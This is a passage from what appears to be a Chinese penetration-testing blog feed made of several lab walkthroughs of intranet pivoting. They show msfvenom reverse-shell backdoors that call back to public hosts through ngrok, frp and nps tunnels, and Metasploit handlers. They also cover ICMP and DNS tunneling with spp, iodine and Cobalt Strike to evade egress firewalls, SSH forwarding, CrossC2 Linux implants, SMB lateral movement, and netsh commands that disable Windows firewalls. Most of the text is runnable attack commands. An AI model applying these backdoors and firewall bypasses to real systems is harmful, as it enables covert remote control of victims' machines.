class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">lhost为赠送域名 lport为刚才设置的端口</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=free.idcfengye.com lport=10239 -f exe -o tcp.exe </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 2222</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924093357416.png" alt="image-20220924093357416"></p><h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>frp是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。<br>自行搭建，方便修改，成本低，使用多样化，适合对隐私有要求的用户</p><p>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p><p>服务器修改配置文件frps.ini：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>启动服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924094839524.png" alt="image-20220924094839524"></p><p>2.控制端-下载-解压-修改-启动</p><p>控制端修改配置文件frpc.ini：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 101.35.21.250</span><br><span class="line">server_port = 7000        #frpc工作端口，必须和上面frps保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555          #转发给本机的5555</span><br><span class="line">remote_port = 6000         #服务端用6000端口转发给本机</span><br></pre></td></tr></table></figure><p>以上配置文件的意思为:建立一个服务器开放一个7000端口用来建立Frp服务用来客户端来建立连接，开通6000端口来接受靶机流量转发给本地的5555端口</p><p>启动客户端：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924094911378.png" alt="image-20220924094911378"><br><img src="/posts/84ae0305/image-20220924094925290.png" alt="image-20220924094925290"><br>成功建立连接<br>生成木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.35.21.250 lport=6000 -f exe -o frp.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set pyload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>3.靶机运行frp.exe即可</p><h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</p><p>服务端：</p><p>1、启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./nps install</span><br><span class="line">./nps</span><br><span class="line">http://IP:8080/  </span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924111907415.png" alt="image-20220924111907415"></p><p>默认密码:admin&#x2F;123</p><p>2、创建客户端，生成密匙<br><img src="/posts/84ae0305/image-20220924112035204.png" alt="image-20220924112035204"></p><p>修改备注其他默认</p><p>3、添加协议隧道，绑定指向</p><p>添加客户端隧道<br><img src="/posts/84ae0305/image-20220924112305588.png" alt="image-20220924112305588"></p><p>远程绑定5555,指向本地6666<br><img src="/posts/84ae0305/image-20220924112733833.png" alt="image-20220924112733833"><br>该配置意思为肉鸡上线流量发到服务端5555端口服务端会转发到客户端6666端口</p><p>客户端：</p><p>1、连接服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./npc -server=101.35.21.250:8024 -vkey=uajwhbu9155qh89v #vkey为创建客户端生成的key</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924113631604.png" alt="image-20220924113631604"></p><p>2、生成后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.35.21.250 lport=5555 -f exe -o nps.exe</span><br></pre></td></tr></table></figure><p>3、监听后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924113811812.png" alt="image-20220924113811812"></p><h2 id="Spp"><a href="#Spp" class="headerlink" title="Spp"></a>Spp</h2><p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br>支持的协议：tcp、udp、udp、icmp、http、kcp、quic<br>支持的类型：正向代理、反向代理、socks5正向代理、socks5反向代理<br>在对抗项目中有遇到过一些极端环境，比如目标封了tcp，http等常用出网的协议，<br>但是icmp，dns等协议可能因为业务需要或者管理者安全意识不到位导致没有封干净。<br>在这种场景下就可以使用这些容易被忽视的协议进行隧道的搭建。</p><p>1、服务端：监听本地的icmp数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./spp -type server -proto ricmp -listen 0.0.0.0</span><br></pre></td></tr></table></figure><p>2、客户端：将本地的8082给到服务器8081上（TCP封装icmp）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -name &quot;test&quot; -type proxy_client -server 101.35.21.250 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp</span><br></pre></td></tr></table></figure><p>3、CS</p><p>监听器1：http 101.35.21.250 8081<br>监听器2：http 127.0.0.1 8082<br>生成后门：监听器2 生成127.0.0.1的后门<br><img src="/posts/84ae0305/image-20220924105605481.png" alt="image-20220924105605481"><br>项目介绍中有更多的协议封装</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网隧道技术&amp;Linux上线</title>
      <link href="/posts/2cb05a91/"/>
      <url>/posts/2cb05a91/</url>
      
        <content type="html"><![CDATA[<h1 id="内网隧道技术-amp-Linux上线"><a href="#内网隧道技术-amp-Linux上线" class="headerlink" title="内网隧道技术&amp;Linux上线"></a>内网隧道技术&amp;Linux上线</h1><p>ICMP和SMB隧道在前面文章中已经实现</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/2cb05a91/A0zT3eux7IjxM1ELmIIAyg.png" alt="img"></p><p>windows服务器设置防火墙出站策略<br><img src="/posts/2cb05a91/image-20220922190239113.png" alt="image-20220922190239113"><br><img src="/posts/2cb05a91/image-20220922190257504.png" alt="image-20220922190257504"><br><img src="/posts/2cb05a91/image-20220922190314617.png" alt="image-20220922190314617"></p><p><img src="/posts/2cb05a91/Jv0uYt6ULlyZLAoBbdgBsg.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iptables -F #清除所有规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许包从22端口进入</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT #允许从22端口进入的包返回</span><br><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT #域名解析端口，一般不开</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT #域名解析端口，一般不开</span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本机访问本机</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT #允许所有IP访问80端口</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables #保存配置</span><br><span class="line">iptables -L #显示iptables列表</span><br></pre></td></tr></table></figure><p>开启ssh协议登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure><h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p><strong>DNS在区域传输为TCP协议 在域名解析时为UDP协议</strong></p><p>判断：**windows:**nslookup<br>     **Linux:**dig<br><img src="/posts/2cb05a91/image-20220922190755393.png" alt="image-20220922190755393"><br>有回显说明可以使用dns协议</p><h3 id="1、上线环境"><a href="#1、上线环境" class="headerlink" title="1、上线环境"></a>1、上线环境</h3><p>内网主机只出网DNS协议数据，解决上线</p><p><strong>域名申请及配置</strong></p><p>先创建一个A记录类型记录值为cs服务端地址</p><p><img src="/posts/2cb05a91/image-20220922191723157.png" alt="image-20220922191723157"><br>然后创建NS记录类型记录值为创建的A型域名<img src="/posts/2cb05a91/image-20220922191705097.png" alt="image-20220922191705097"><br>当解析时ns1.fattyy.top会解析为cs.fattyy.top而cs.fattyy.top会解析为cs服务端地址</p><p><strong>监听器创建及配置</strong><br><img src="/posts/2cb05a91/image-20220922192958843.png" alt="image-20220922192958843"></p><p><strong>后门绑定监听器及生成</strong></p><p><img src="/posts/2cb05a91/image-20220922193108067.png" alt="image-20220922193108067"><br>运行木马<br><img src="/posts/2cb05a91/image-20220922223045482.png" alt="image-20220922223045482"><br>上线一个黑框<br>会话交互输入checkin<br><img src="/posts/2cb05a91/image-20220922223425217.png" alt="image-20220922223425217"></p><h3 id="2、通讯环境"><a href="#2、通讯环境" class="headerlink" title="2、通讯环境"></a>2、通讯环境</h3><p>内网主机只出网DNS协议数据，解决通讯，但有点鸡肋需要在目标机执行命令……</p><p>项目:<a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p><p><strong>服务器：</strong>设置密码test并创建虚拟IP及绑定域名指向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodined -f -c -P test 192.168.0.1 ns1.fattyy.top -DD</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923083523457.png" alt="image-20220923083523457"><br><img src="/posts/2cb05a91/image-20220923083542470.png" alt="image-20220923083542470"><br>可以看到多出来一个192.168.0.1的网卡</p><p><strong>客户端：</strong>连接密码test并绑定域名指向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -M 200 -P test ns1.fattyy.top</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923083824757.png" alt="image-20220923083824757"><br><img src="/posts/2cb05a91/image-20220923083859004.png" alt="image-20220923083859004"></p><p>服务端尝试通讯尝试连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.0.4</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923084159924.png" alt="image-20220923084159924"><br>成功通讯</p><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>由于SSH协议存在于Linux系统，跳板机必须Linux</p><p>**条件:**需要取得一个root权限的linux系统<br>由于CS无SSH协议监听器配置，无法上线</p><p>本地：出站协议被封</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将目标机:80端口流量转发到跳板机:1122</span></span><br><span class="line">ssh -CfNg -L 1122:192.168.1.15:80 root@192.168.1.166</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">跳板机接收流量</span></span><br><span class="line">curl http://127.0.0.1:1122</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923091654829.png" alt="image-20220923091654829"><br>需要输入跳板机密码<br><img src="/posts/2cb05a91/image-20220923092027085.png" alt="image-20220923092027085"></p><p>远程：入站协议被封</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将目标机:80端口流量转发到远程攻击机:1234</span></span><br><span class="line">ssh -CfNg -R 1234:192.168.1.15:80 root@47.94.236.117</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远程攻击机接受流量</span></span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923092318305.png" alt="image-20220923092318305"></p><h2 id="CrossC2-Linux上线"><a href="#CrossC2-Linux上线" class="headerlink" title="CrossC2-Linux上线"></a>CrossC2-Linux上线</h2><p>项目地址:<a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br>使用参考:<a href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a><br>搭建参考:<a href="https://blog.csdn.net/weixin_42742658/article/details/122844041">https://blog.csdn.net/weixin_42742658/article/details/122844041</a></p><p>面向Linux Mac IOS Android系统上线支持<br>1、插件使用<br>cs加载三个cna文件<br><img src="/posts/2cb05a91/image-20220923152252183.png" alt="image-20220923152252183"><br>修改CrossCut-githubbot.cna文件<br><img src="/posts/2cb05a91/image-20220923195431436.png" alt="image-20220923195431436"><br><code>$CC2_PATH</code>为genCrossC2.Linux的路径<br><code>$CC2_BIN</code>生成linux木马就选择genCrossC2.Linux mac木马就选genCrossC2.mac<br>生成后门<br><img src="/posts/2cb05a91/image-20220923152347027.png" alt="image-20220923152347027"><br><img src="/posts/2cb05a91/image-20220923192133726.png" alt="image-20220923192133726"><br><img src="/posts/2cb05a91/image-20220923193715577.png" alt="image-20220923193715577"><br>将命令复制到服务器上执行即可生成木马<br>给执行权限然后运行上线<br><img src="/posts/2cb05a91/image-20220923192010159.png" alt="image-20220923192010159"><br><img src="/posts/2cb05a91/image-20220923234755158.png" alt="image-20220923234755158"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层内网不出网绕过防火墙SMB隧道&amp;转发上线</title>
      <link href="/posts/59813d6f/"/>
      <url>/posts/59813d6f/</url>
      
        <content type="html"><![CDATA[<h1 id="多层内网不出网绕过防火墙SMB隧道-amp-转发上线"><a href="#多层内网不出网绕过防火墙SMB隧道-amp-转发上线" class="headerlink" title="多层内网不出网绕过防火墙SMB隧道&amp;转发上线"></a>多层内网不出网绕过防火墙SMB隧道&amp;转发上线</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/59813d6f/QfozOFxpvTuyPpTabJC3MA.png" alt="QfozOFxpvTuyPpTabJC3MA"></p><p>各个系统的网卡配置见上篇文章，区别就是Server2008和Server2012的防火墙</p><p>Server2008<br><img src="/posts/59813d6f/image-20220918235727419.png" alt="image-20220918235727419"></p><p>Server2012<br><img src="/posts/59813d6f/image-20220918235956279.png" alt="image-20220918235956279"></p><h2 id="Win7-amp-Win10上线"><a href="#Win7-amp-Win10上线" class="headerlink" title="Win7&amp;Win10上线"></a>Win7&amp;Win10上线</h2><p>这两个主机的上线方式和上篇文章相同，先拿到win7shell然后正向链接win10，详情可以看上篇文章<br><img src="/posts/59813d6f/image-20220919091420122.png" alt="image-20220919091420122"></p><h2 id="Server2008上线-转发"><a href="#Server2008上线-转发" class="headerlink" title="Server2008上线-转发"></a>Server2008上线-转发</h2><p>这里和上篇文章不同的是多了一个防火墙只让访问web服务也就是只有80端口,那么以前的正向链接思路也就行不通了，因为只可以访问80端口可以访问，如果创建一个80的木马又和web服务有冲突。<br>所以要想拿下Server2008就要使用反向拦截将数据发送给win10然后再转发给攻击机，但是直接建立192.168.22.130监听的马win10并不会转到我们的攻击机<br>所以Win10建立一个转发上线监听器<br><img src="/posts/59813d6f/image-20220919130210004.png" alt="image-20220919130210004"><br><img src="/posts/59813d6f/image-20220919130613533.png" alt="image-20220919130613533"><br>然后创建该监听器的马<br><img src="/posts/59813d6f/image-20220919131055422.png" alt="image-20220919131055422"><br>server2008执行上线<br><img src="/posts/59813d6f/image-20220919131155812.png" alt="image-20220919131155812"><br>看一下拓扑视图<br><img src="/posts/59813d6f/image-20220919131325903.png" alt="image-20220919131325903"><br>可以看到Server2008将数据转到Win10达成上线</p><h2 id="Server2012上线-smb隧道"><a href="#Server2012上线-smb隧道" class="headerlink" title="Server2012上线-smb隧道"></a>Server2012上线-smb隧道</h2><p>这里又有一个坑,如果继续使用反向链接去链接Server2008那么就触发了2008的入站规则直接gg,但同时他又有入站规则正向连接也gg,那就没办法上线了么,当然是有方法的就是通过smb隧道进行通讯<br><strong>什么是smb</strong><br>smb是一种协议名，smb服务的作用在于计算机间共享文件、打印机和串口等。<br>CS建立smb监听器<br><img src="/posts/59813d6f/image-20220919151313190.png" alt="image-20220919151313190"><br>注意smb监听器不能生成木马应为他并没有目标地址和端口,而是建立smb隧道,让后借助横向移动的方法达到上线<br>先借助2008对内网进行扫描<br><img src="/posts/59813d6f/image-20220919151850690.png" alt="image-20220919151850690"><br><img src="/posts/59813d6f/image-20220919151906193.png" alt="image-20220919151906193"></p><p>扫描完整后到目标列表进行横向移动<br><img src="/posts/59813d6f/image-20220919185045712.png" alt="image-20220919185045712"><br>输入主机密码（可通过前期信息搜集获得，见以前文章)<br>监听器选择之前创建的smb<br>会话选择Server2008<br><img src="/posts/59813d6f/image-20220919190150560.png" alt="image-20220919190150560"><br>成功上线</p><h3 id="其他上线方法"><a href="#其他上线方法" class="headerlink" title="其他上线方法"></a>其他上线方法</h3><p>我们已经拿到了Server2008的shell可以通过shell把命令关了</p><p>Windows防火墙命令：<br><a href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前防火墙状态：</span></span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙：</span></span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启防火墙：</span></span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">恢复初始防火墙设置：</span></span><br><span class="line">netsh advfirewall reset</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启用桌面防火墙:</span> </span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置默认输入和输出策略：</span></span><br><span class="line">netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果设置为拒绝使用blockinbound,blockoutbound</span></span><br></pre></td></tr></table></figure><p>注意cs执行shell命令必须在会话交互窗口输入shell 然后再加执行的命令<br>关闭防火墙<br><img src="/posts/59813d6f/image-20220919224422050.png" alt="image-20220919224422050"><br>再以Server2008创建一个转发上线监听器<br><img src="/posts/59813d6f/image-20220919224827880.png" alt="image-20220919224827880"><br>创建该监听器的木马传到Server2012执行<br><img src="/posts/59813d6f/image-20220919225001754.png" alt="image-20220919225001754"><br>再次上线<br><img src="/posts/59813d6f/image-20220919225052334.png" alt="image-20220919225052334"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>进行内网渗透是要根据防火墙的规则来选择上线方式,可以先测试可以利用了那些协议icmp，tcp，smb等等<br>如果防火墙规则无法关闭是否可以通过关闭其中一个主机的防火墙来达到上线效果<br>但是关闭防火墙这种方法单纯的内网环境如果是域策略同步这种那么这种方法将失效</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层内网不出网Socks代理通讯上线</title>
      <link href="/posts/c4250965/"/>
      <url>/posts/c4250965/</url>
      
        <content type="html"><![CDATA[<h1 id="多层内网不出网Socks代理通讯上线"><a href="#多层内网不出网Socks代理通讯上线" class="headerlink" title="多层内网不出网Socks代理通讯上线"></a>多层内网不出网Socks代理通讯上线</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在内网渗透中会遇到众多内网机器不出网的情况,对渗透工作造成阻碍，这就需要代理技术来进一步对内网机器进行控制，通过内网中一台出网主机为节点对其他不出网主机建立通讯，从而达到被控。本文以MSF和CS两个主流工具进行测试</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/c4250965/LLc4qeTwaCOdzdGYloBkCQ.png" alt="LLc4qeTwaCOdzdGYloBkCQ"></p><p>VMware添加网卡<br><img src="/posts/c4250965/image-20220917101457747.png" alt="image-20220917101457747"><br>Win7<br><img src="/posts/c4250965/image-20220917102725290.png" alt="image-20220917102725290"><br>Win10<br><img src="/posts/c4250965/image-20220917102609833.png" alt="image-20220917102609833"><br>Server2008<br><img src="/posts/c4250965/image-20220917111247738.png" alt="image-20220917111247738"><br>Server2012<br><img src="/posts/c4250965/image-20220917111349341.png" alt="image-20220917111349341"><br>整个环境只有Win7可以出网其他主机均不能访问外网<br>搭建完成后在各系统下安装一个web界面方便测试<br>为了方便所有后门都通过vmtools拉到虚拟机 实战环境要测试如何传马</p><p>**背景介绍:**现在已经控制Win7需要进一步向下渗透，常规思路可以将工具上传到win7然后一层一层向下渗透，但是实际环境下工具太大，被杀，需要安装等问题都会阻拦继续向下渗透，可以以win7为节点实现攻击机向win10通讯，其他主机思路相同</p><p>Win7拿shell<br>msf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom - p windows/metmsfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=3333 -f exe &gt; xd.exe</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>运行后门上线<br>cs直接生成后门运行上线<br>由于后面的主机不出网我们的攻击机无法建立通讯，所以应该想办法建立通讯才可以继续后面的操作</p><h2 id="Win10通讯-amp-上线"><a href="#Win10通讯-amp-上线" class="headerlink" title="Win10通讯&amp;上线"></a>Win10通讯&amp;上线</h2><h3 id="MSF通讯"><a href="#MSF通讯" class="headerlink" title="MSF通讯"></a>MSF通讯</h3><p>1、添加路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由</span><br><span class="line">run post/multi/manage/autoroute </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加指定路由，1是接收的session编号 一般使用上方命令即可</span></span><br><span class="line">route add 192.168.11.0 255.255.255.0 1</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917153408096.png" alt="image-20220917153408096"><br><img src="/posts/c4250965/image-20220917153614689.png" alt="image-20220917153614689"><br>现在就有了内网段的路由<br>但是这只实现了msf可以和内网实现通讯，其他工具并不能建立连接，还需要使用sock来进一步建立连接</p><p>2、Sock代理<br><img src="/posts/c4250965/image-20220917154311496.png" alt="image-20220917154311496"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先将win7会话置于后台</span></span><br><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 1122</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917154550252.png" alt="image-20220917154550252"></p><p>启用代理软件配置Sock5代理<br>这里使用浏览器插件Proxy SwitchyOmega<br><img src="/posts/c4250965/image-20220917160200742.png" alt="image-20220917160200742"><br>添加完成后选择使用代理访问内网地址 192.168.11.129<br><img src="/posts/c4250965/image-20220917155232079.png" alt="image-20220917155232079"><br>成功访问<br>也可以使用其他代理工具:SocksCap Proxifier ProxyChains等</p><h3 id="CS通讯"><a href="#CS通讯" class="headerlink" title="CS通讯"></a>CS通讯</h3><p><img src="/posts/c4250965/image-20220917161138881.png" alt="image-20220917161138881"><br><img src="/posts/c4250965/image-20220917161213025.png" alt="image-20220917161213025"><br>注意CS的代理协议为cocks4a<br><img src="/posts/c4250965/image-20220917163512573.png" alt="image-20220917163512573"><br><img src="/posts/c4250965/image-20220917163546627.png" alt="image-20220917163546627"><br>访问成功</p><h3 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h3><p>目前为止成功与win10建立通讯接下来要想办法将win10上线 因为win10没有办法出网所以采用正向连接的方法进行上线<br>上传一个127.0.0.1 9090的木马将流量指向本地9090端口,然后我们去连接9090端口<br><img src="/posts/c4250965/image-20220917190253795.png" alt="image-20220917190253795"><br>生成该监听器的木马<br><img src="/posts/c4250965/image-20220917172159222.png" alt="image-20220917172159222"><br>win10运行该木马<br>CS命令行–win7会话交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.11.129 9090</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917190235166.png" alt="image-20220917190235166"></p><p>成功上线</p><h3 id="MSF上线"><a href="#MSF上线" class="headerlink" title="MSF上线"></a>MSF上线</h3><p>思路和CS上线相同依旧是正向连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">后门生成</span></span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe &gt; bd.exe</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">监听</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.11.129</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>win10运行后门</p><p><img src="/posts/c4250965/image-20220917191306644.png" alt="image-20220917191306644"></p><p>上线成功</p><h2 id="Server2008通讯-amp-上线"><a href="#Server2008通讯-amp-上线" class="headerlink" 